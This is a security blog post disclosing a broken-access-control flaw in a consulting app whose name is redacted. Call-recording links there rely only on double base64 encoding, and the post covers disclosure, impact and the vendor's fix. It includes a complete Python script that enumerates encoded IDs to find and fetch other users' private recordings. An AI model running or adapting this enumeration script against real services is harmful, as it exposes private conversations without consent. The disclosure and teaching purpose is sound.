<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed | Gaurang Bhatnagar</title><meta name=keywords content="Vulnerability,Crypto,Broken Access Control"><meta name=description content="Time and again, we&rsquo;re reminded that mere encoding doesn&rsquo;t equate to robust encryption or security. Relying primarily on encoding as a defense can expose companies to unexpected vulnerabilities. While encoding can help obscure information, it&rsquo;s crucial to remember it&rsquo;s not a substitute for genuine encryption or tight access control.
This recent lapse came to light in a popular online consulting platform&rsquo;s mobile app, available on both Android and iOS.
As the focus of this blog article is educational, centered around the vulnerability, I will abstain from naming the organization."><meta name=author content="Gaurang Bhatnagar"><link rel=canonical href=https://offsec.space/posts/beyond-base64><meta name=google-site-verification content="G-XNVLZLHRRE"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.a65f8ab9139e332ad4e22a6568e8bc26b4c4ec6ff0dcd1d22ffc4018f5425c38.css integrity="sha256-pl+KuROeMyrU4iplaOi8JrTE7G/w3NHSL/xAGPVCXDg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://offsec.space/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://offsec.space/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://offsec.space/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://offsec.space/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://offsec.space/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-XNVLZLHRRE"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XNVLZLHRRE",{anonymize_ip:!1})}</script><meta property="og:title" content="Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed"><meta property="og:description" content="Time and again, we&rsquo;re reminded that mere encoding doesn&rsquo;t equate to robust encryption or security. Relying primarily on encoding as a defense can expose companies to unexpected vulnerabilities. While encoding can help obscure information, it&rsquo;s crucial to remember it&rsquo;s not a substitute for genuine encryption or tight access control.
This recent lapse came to light in a popular online consulting platform&rsquo;s mobile app, available on both Android and iOS.
As the focus of this blog article is educational, centered around the vulnerability, I will abstain from naming the organization."><meta property="og:type" content="article"><meta property="og:url" content="https://offsec.space/posts/beyond-base64/"><meta property="og:image" content="https://offsec.space/img/beyondb64/cover.gif"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-25T00:01:03+00:00"><meta property="article:modified_time" content="2023-09-25T00:01:03+00:00"><meta property="og:site_name" content="Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://offsec.space/img/beyondb64/cover.gif"><meta name=twitter:title content="Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed"><meta name=twitter:description content="Time and again, we&rsquo;re reminded that mere encoding doesn&rsquo;t equate to robust encryption or security. Relying primarily on encoding as a defense can expose companies to unexpected vulnerabilities. While encoding can help obscure information, it&rsquo;s crucial to remember it&rsquo;s not a substitute for genuine encryption or tight access control.
This recent lapse came to light in a popular online consulting platform&rsquo;s mobile app, available on both Android and iOS.
As the focus of this blog article is educational, centered around the vulnerability, I will abstain from naming the organization."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://offsec.space/posts/"},{"@type":"ListItem","position":2,"name":"Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed","item":"https://offsec.space/posts/beyond-base64/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed","name":"Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed","description":"Time and again, we\u0026rsquo;re reminded that mere encoding doesn\u0026rsquo;t equate to robust encryption or security. Relying primarily on encoding as a defense can expose companies to unexpected vulnerabilities. While encoding can help obscure information, it\u0026rsquo;s crucial to remember it\u0026rsquo;s not a substitute for genuine encryption or tight access control.\nThis recent lapse came to light in a popular online consulting platform\u0026rsquo;s mobile app, available on both Android and iOS.\nAs the focus of this blog article is educational, centered around the vulnerability, I will abstain from naming the organization.","keywords":["Vulnerability","Crypto","Broken Access Control"],"articleBody":"Time and again, we’re reminded that mere encoding doesn’t equate to robust encryption or security. Relying primarily on encoding as a defense can expose companies to unexpected vulnerabilities. While encoding can help obscure information, it’s crucial to remember it’s not a substitute for genuine encryption or tight access control.\nThis recent lapse came to light in a popular online consulting platform’s mobile app, available on both Android and iOS.\nAs the focus of this blog article is educational, centered around the vulnerability, I will abstain from naming the organization. However, I can share that it’s a renowned Indian firm, with its app being utilized by over 43M users.\nThis widely-used app, known for its online consultations, learned the lesson the hard way. The company opted to encode parameter values but, regrettably, did not pair this with stringent access controls. This created a security gap, notably around call recordings. In this article, we will delve into this matter, highlighting the significance of such lapses and the potential threat to our personal data.\nThe following issue was first brought to the attention of the CEO through LinkedIn and was also communicated via email to the company’s support address. Despite highlighting the severity of the problem, there was a lack of responsiveness from the company. As a result, the matter had to be escalated and filed with the CERT-IN panel. It was only after CERT-IN’s intervention that the issue was addressed and mitigated.\nVulnerability Details The vulnerability allows unauthenticated users to decode shareable links and alter the parameters, thereby accessing private call recordings of users.\nThe core of the vulnerability revolves around how the website handles (encodes and decodes) URL parameters.\nIn the mobile app, which is available for both Android and iOS, users can share their call recordings.\nHere’s the interface for sharing the call recording (notice the share icon):\nFollowing is the shareable link generated:\nWhen you click on the provided link (https://[redacted].com/play/shared/TVRZNE1UazRPRFF4TlRBME1RPT0), it redirects you to https://[redacted].com/call-recording/TVRZNE1UazRPRFF4TlRBME1RPT0, where you can access the call recording without requiring any authentication.\nFor context, consider this shareable link: https://[redacted].com/call-recording/TVRZNE1UazRPRFF4TlRBME1RPT0\nThe part TVRZNE1UazRPRFF4TlRBME1RPT0 in this link is the result of double encoding using base64. When this value undergoes double decoding, it translates into a 13-digit number. Alarmingly, by adjusting the last seven digits of this number and then encoding it back the same way, an individual can gain unauthorized access to others’ call recordings.\nBy visiting the link https://[redacted].com/call-recording/* (with the appropriate encoded value), one can view the name of the customer and the person they spoke to, along with the call recording itself.\nThese recordings reside in an S3 bucket and can also be directly accessed using the link https://[redacted].com/play/* (where * represents the base64 encoded value).\nInterestingly, even when users believe they’ve deleted the recordings from their accounts, these recordings remain stored in the S3 bucket. While the recording might not be accessible through the https://[redacted].com/call-recording/* link, it can still be retrieved and downloaded using the https://[redacted].com/play/* link.\nExploit A Python script was developed with the capability to extract call recordings from the application’s users. Given that this involved a production environment with genuine user data, the script was tested exclusively on specific test accounts, using a designated range of numerical values. The script successfully accessed recordings associated with these test accounts.\nHere’s the snapshot of the valid call recordings obtained:\nThe following python script was used to exploit the vulnerability:\nimport requests import base64 # Initial URL url = \"https://[redacted].com/play/MTY4MTk4ODQxNTA0MQ\" base_url = \"https://[redacted].com/play/\" encoded_path = url.split('/')[-1] padding = len(encoded_path) % 4 if padding != 0: encoded_path += \"=\" * (4 - padding) decoded_path = base64.b64decode(encoded_path).decode('utf-8') prefix = decoded_path[:6] num = int(decoded_path[6:]) valid_urls = [] valid_paths = [] for i in range(num, num+1000): # Adjust this range based on your needs new_path = prefix + str(i).zfill(7) new_encoded_path = base64.b64encode(new_path.encode('utf-8')).decode('utf-8') new_encoded_path = new_encoded_path.rstrip(\"=\") new_url = base_url + new_encoded_path print(f\"Making request to: {new_url}\") response = requests.get(new_url, allow_redirects=False) print(f\"Received status code: {response.status_code}\") if \"cannot find recording\" not in response.text: valid_urls.append(new_url) valid_paths.append(new_path) print(\"\\nValid URLs:\") for url in valid_urls: print(f\"\\033[92m[+] {url}\\033[0m\") print(\"\\nValid shareable links:\") for path in valid_paths: double_encoded_path = base64.b64encode(base64.b64encode(path.encode('utf-8'))).decode('utf-8').rstrip(\"=\") print(f\"\\033[92m[+] https://[redacted].com/call-recording/{double_encoded_path}\\033[0m\") The underlying logic of the Python script revolves around searching for legitimate recording URLs on [redacted].com (https://[redacted].com/play/). It begins with a known valid URL and proceeds by attempting various combinations of this URL. The script determines the authenticity of URLs based on the HTTP response it receives upon each request. Conclusively, it generates a list of shareable links (https://[redacted].com/call-recording/) by double base64-encoding the validated paths and merging these with another primary URL.\nTo understand the script’s operation better, here’s a brief breakdown:\nParsing the initial URL: The script first parses an initial URL string, extracting the base64-encoded part from the path. Base64 decoding: It then base64-decodes this path, and extracts a prefix and a number from the decoded string. Generating URLs: The script uses this prefix and number as a base to generate a range of potential new URLs. It does this by appending different numbers to the prefix, base64-encoding the result, and appending this to a base URL. Sending requests: For each newly generated URL, the script sends a HTTP GET request, checking the response. Checking response: If the message “cannot find recording” is not in the response, the script assumes the URL is valid and and adds it to a list of valid URLs and paths. Displaying valid URLs and shareable links: Finally, the script prints out all the valid URLs it found. It also creates and prints a list of shareable links by double base64-encoding the valid paths and appending these to another base URL. Impact The vulnerability lead to unauthorized access to call recordings that users assume are private, presenting a significant security and privacy threat for users of the affected website. The potential repercussions include:\nUsers often share sensitive details in their call recordings, expecting them to remain private. This vulnerability undermines that expectation.\nMalicious actors can exploit this flaw to access and hear recordings they have no right to, intruding on users’ privacy.\nSuch exposed recordings can be weaponized for nefarious aims, such as impersonation or identity theft, through techniques like social engineering.\nVendor’s Mitigation The company has addressed the issue by altering the structure of the call recording URL. Instead of the earlier encoding approach, they’ve adopted a nondeterministic identifier for pointing to call recordings. The updated URL format is:\nhttps://[redacted].com/call-recording/bc0b4fe8-8054-4502-b06e-99b2b45dc76d\nAdditionally, these URLs now have a Time-To-Live (TTL) feature, ensuring they expire after a certain duration. In relation to the S3 storage, the associated S3 recording URL will also become non-functional after the designated TTL.\nConclusion The vulnerability’s potential reach was staggering, with the potential to affect up to 43 million unique users. This vast number magnifies the implications of what might seem like a minor technical oversight. The company’s claim to have served 43 million users translates to an equal number of individuals being at risk of having their personal and private conversations accessed without authorization. This is more than just a number; it represents countless moments of personal sharing, confidential discussions, and intimate details, all of which could have potentially been laid bare.\nRelying on base64 encoding, which is not a security measure by design, combined with an absence of proper access control, essentially left the door open for potential malicious access. Such a flaw not only risks the sensitive data of millions of users but can also jeopardize the trust that users place in digital platforms.\n","wordCount":"1242","inLanguage":"en","image":"https://offsec.space/img/beyondb64/cover.gif","datePublished":"2023-09-25T00:01:03Z","dateModified":"2023-09-25T00:01:03Z","author":{"@type":"Person","name":"Gaurang Bhatnagar"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://offsec.space/posts/beyond-base64/"},"publisher":{"@type":"Organization","name":"Gaurang Bhatnagar","logo":{"@type":"ImageObject","url":"https://offsec.space/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://offsec.space/ accesskey=h title="Home (Alt + H)"><img src=https://offsec.space/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://offsec.space/about/ title=About><span>About</span></a></li><li><a href=https://offsec.space/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://offsec.space/projects/ title=Projects><span>Projects</span></a></li><li><a href=https://offsec.space/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://offsec.space/>Home</a>&nbsp;»&nbsp;<a href=https://offsec.space/posts/>Posts</a></div><h1 class=post-title>Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed</h1><div class=post-meta><span title='2023-09-25 00:01:03 +0000 +0000'>September 25, 2023</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1242 words&nbsp;·&nbsp;Gaurang Bhatnagar&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/beyond-base64.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><img loading=lazy src=https://offsec.space/img/beyondb64/cover.gif alt><p></p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#vulnerability-details>Vulnerability Details</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#impact>Impact</a></li><li><a href=#vendors-mitigation>Vendor&rsquo;s Mitigation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></details></div><div class=post-content><p>Time and again, we&rsquo;re reminded that mere encoding doesn&rsquo;t equate to robust encryption or security. Relying primarily on encoding as a defense can expose companies to unexpected vulnerabilities. While encoding can help obscure information, it&rsquo;s crucial to remember it&rsquo;s not a substitute for genuine encryption or tight access control.</p><p>This recent lapse came to light in a popular online consulting platform&rsquo;s mobile app, available on both Android and iOS.</p><p>As the focus of this blog article is educational, centered around the vulnerability, I will abstain from naming the organization. However, I can share that it&rsquo;s a renowned Indian firm, with its app being utilized by over 43M users.</p><p>This widely-used app, known for its online consultations, learned the lesson the hard way. The company opted to encode parameter values but, regrettably, did not pair this with stringent access controls. This created a security gap, notably around call recordings. In this article, we will delve into this matter, highlighting the significance of such lapses and the potential threat to our personal data.</p><p>The following issue was first brought to the attention of the CEO through LinkedIn and was also communicated via email to the company&rsquo;s support address. Despite highlighting the severity of the problem, there was a lack of responsiveness from the company. As a result, the matter had to be escalated and filed with the CERT-IN panel. It was only after CERT-IN&rsquo;s intervention that the issue was addressed and mitigated.</p><h2 id=vulnerability-details>Vulnerability Details<a hidden class=anchor aria-hidden=true href=#vulnerability-details>#</a></h2><p>The vulnerability allows unauthenticated users to decode shareable links and alter the parameters, thereby accessing private call recordings of users.</p><p>The core of the vulnerability revolves around how the website handles (encodes and decodes) URL parameters.</p><p>In the mobile app, which is available for both Android and iOS, users can share their call recordings.</p><p>Here&rsquo;s the interface for sharing the call recording (notice the share icon):</p><p><img loading=lazy src=/img/beyondb64/interface.jpg alt=interface></p><p>Following is the shareable link generated:</p><p><img loading=lazy src=/img/beyondb64/shareable.png alt=shareable></p><p>When you click on the provided link (<code>https://[redacted].com/play/shared/TVRZNE1UazRPRFF4TlRBME1RPT0</code>), it redirects you to <code>https://[redacted].com/call-recording/TVRZNE1UazRPRFF4TlRBME1RPT0</code>, where you can access the call recording without requiring any authentication.</p><p>For context, consider this shareable link:
<code>https://[redacted].com/call-recording/TVRZNE1UazRPRFF4TlRBME1RPT0</code></p><p>The part <code>TVRZNE1UazRPRFF4TlRBME1RPT0</code> in this link is the result of double encoding using base64. When this value undergoes double decoding, it translates into a 13-digit number. Alarmingly, by adjusting the last seven digits of this number and then encoding it back the same way, an individual can gain unauthorized access to others&rsquo; call recordings.</p><p>By visiting the link <code>https://[redacted].com/call-recording/*</code> (with the appropriate encoded value), one can view the name of the customer and the person they spoke to, along with the call recording itself.</p><p>These recordings reside in an S3 bucket and can also be directly accessed using the link <code>https://[redacted].com/play/*</code> (where <code>*</code> represents the base64 encoded value).</p><p>Interestingly, even when users believe they&rsquo;ve deleted the recordings from their accounts, these recordings remain stored in the S3 bucket. While the recording might not be accessible through the <code>https://[redacted].com/call-recording/*</code> link, it can still be retrieved and downloaded using the <code>https://[redacted].com/play/*</code> link.</p><h2 id=exploit>Exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h2><p>A Python script was developed with the capability to extract call recordings from the application&rsquo;s users. Given that this involved a production environment with genuine user data, the script was tested exclusively on specific test accounts, using a designated range of numerical values. The script successfully accessed recordings associated with these test accounts.</p><p>Here&rsquo;s the snapshot of the valid call recordings obtained:</p><p><img loading=lazy src=/img/beyondb64/recordings.png alt=recordings></p><p>The following python script was used to exploit the vulnerability:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Initial URL</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;https://[redacted].com/play/MTY4MTk4ODQxNTA0MQ&#34;</span>
</span></span><span class=line><span class=cl><span class=n>base_url</span> <span class=o>=</span> <span class=s2>&#34;https://[redacted].com/play/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>encoded_path</span> <span class=o>=</span> <span class=n>url</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>padding</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>encoded_path</span><span class=p>)</span> <span class=o>%</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>padding</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>encoded_path</span> <span class=o>+=</span> <span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>4</span> <span class=o>-</span> <span class=n>padding</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>decoded_path</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encoded_path</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prefix</span> <span class=o>=</span> <span class=n>decoded_path</span><span class=p>[:</span><span class=mi>6</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>decoded_path</span><span class=p>[</span><span class=mi>6</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>valid_urls</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>valid_paths</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>num</span><span class=p>,</span> <span class=n>num</span><span class=o>+</span><span class=mi>1000</span><span class=p>):</span>  <span class=c1># Adjust this range based on your needs</span>
</span></span><span class=line><span class=cl>    <span class=n>new_path</span> <span class=o>=</span> <span class=n>prefix</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>new_encoded_path</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>new_path</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>new_encoded_path</span> <span class=o>=</span> <span class=n>new_encoded_path</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>new_url</span> <span class=o>=</span> <span class=n>base_url</span> <span class=o>+</span> <span class=n>new_encoded_path</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Making request to: </span><span class=si>{</span><span class=n>new_url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>new_url</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Received status code: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;cannot find recording&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>valid_urls</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>new_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>valid_paths</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>new_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Valid URLs:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>url</span> <span class=ow>in</span> <span class=n>valid_urls</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[92m[+] </span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=se>\033</span><span class=s2>[0m&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Valid shareable links:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>path</span> <span class=ow>in</span> <span class=n>valid_paths</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>double_encoded_path</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>path</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\033</span><span class=s2>[92m[+] https://[redacted].com/call-recording/</span><span class=si>{</span><span class=n>double_encoded_path</span><span class=si>}</span><span class=se>\033</span><span class=s2>[0m&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>The underlying logic of the Python script revolves around searching for legitimate recording URLs on [redacted].com (<code>https://[redacted].com/play/</code>). It begins with a known valid URL and proceeds by attempting various combinations of this URL. The script determines the authenticity of URLs based on the HTTP response it receives upon each request. Conclusively, it generates a list of shareable links (<code>https://[redacted].com/call-recording/</code>) by double base64-encoding the validated paths and merging these with another primary URL.</p><p>To understand the script&rsquo;s operation better, here&rsquo;s a brief breakdown:</p><ul><li><strong>Parsing the initial URL:</strong> The script first parses an initial URL string, extracting the base64-encoded part from the path.</li><li><strong>Base64 decoding:</strong> It then base64-decodes this path, and extracts a prefix and a number from the decoded string.</li><li><strong>Generating URLs:</strong> The script uses this prefix and number as a base to generate a range of potential new URLs. It does this by appending different numbers to the prefix, base64-encoding the result, and appending this to a base URL.</li><li><strong>Sending requests:</strong> For each newly generated URL, the script sends a HTTP GET request, checking the response.</li><li><strong>Checking response:</strong> If the message &ldquo;cannot find recording&rdquo; is not in the response, the script assumes the URL is valid and and adds it to a list of valid URLs and paths.</li><li><strong>Displaying valid URLs and shareable links:</strong> Finally, the script prints out all the valid URLs it found. It also creates and prints a list of shareable links by double base64-encoding the valid paths and appending these to another base URL.</li></ul><h2 id=impact>Impact<a hidden class=anchor aria-hidden=true href=#impact>#</a></h2><p>The vulnerability lead to unauthorized access to call recordings that users assume are private, presenting a significant security and privacy threat for users of the affected website. The potential repercussions include:</p><ul><li><p>Users often share sensitive details in their call recordings, expecting them to remain private. This vulnerability undermines that expectation.</p></li><li><p>Malicious actors can exploit this flaw to access and hear recordings they have no right to, intruding on users&rsquo; privacy.</p></li><li><p>Such exposed recordings can be weaponized for nefarious aims, such as impersonation or identity theft, through techniques like social engineering.</p></li></ul><h2 id=vendors-mitigation>Vendor&rsquo;s Mitigation<a hidden class=anchor aria-hidden=true href=#vendors-mitigation>#</a></h2><p>The company has addressed the issue by altering the structure of the call recording URL. Instead of the earlier encoding approach, they&rsquo;ve adopted a nondeterministic identifier for pointing to call recordings. The updated URL format is:</p><p><code>https://[redacted].com/call-recording/bc0b4fe8-8054-4502-b06e-99b2b45dc76d</code></p><p>Additionally, these URLs now have a Time-To-Live (TTL) feature, ensuring they expire after a certain duration. In relation to the S3 storage, the associated S3 recording URL will also become non-functional after the designated TTL.</p><h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2><p>The vulnerability&rsquo;s potential reach was staggering, with the potential to affect up to 43 million unique users. This vast number magnifies the implications of what might seem like a minor technical oversight. The company&rsquo;s claim to have served 43 million users translates to an equal number of individuals being at risk of having their personal and private conversations accessed without authorization.
This is more than just a number; it represents countless moments of personal sharing, confidential discussions, and intimate details, all of which could have potentially been laid bare.</p><p>Relying on base64 encoding, which is not a security measure by design, combined with an absence of proper access control, essentially left the door open for potential malicious access. Such a flaw not only risks the sensitive data of millions of users but can also jeopardize the trust that users place in digital platforms.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://offsec.space/tags/vulnerability/>Vulnerability</a></li><li><a href=https://offsec.space/tags/crypto/>Crypto</a></li><li><a href=https://offsec.space/tags/broken-access-control/>Broken Access Control</a></li></ul><nav class=paginav><a class=next href=https://offsec.space/posts/airtel-vulnerabilities/><span class=title>Next »</span><br><span>Multiple Vulnerabilities found in Airtel Android Application</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed on twitter" href="https://twitter.com/intent/tweet/?text=Beyond%20Base64%3a%20The%20Vulnerability%20Leaving%20Millions%20of%20Calls%20Exposed&url=https%3a%2f%2foffsec.space%2fposts%2fbeyond-base64%2f&hashtags=Vulnerability%2cCrypto%2cBrokenAccessControl"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 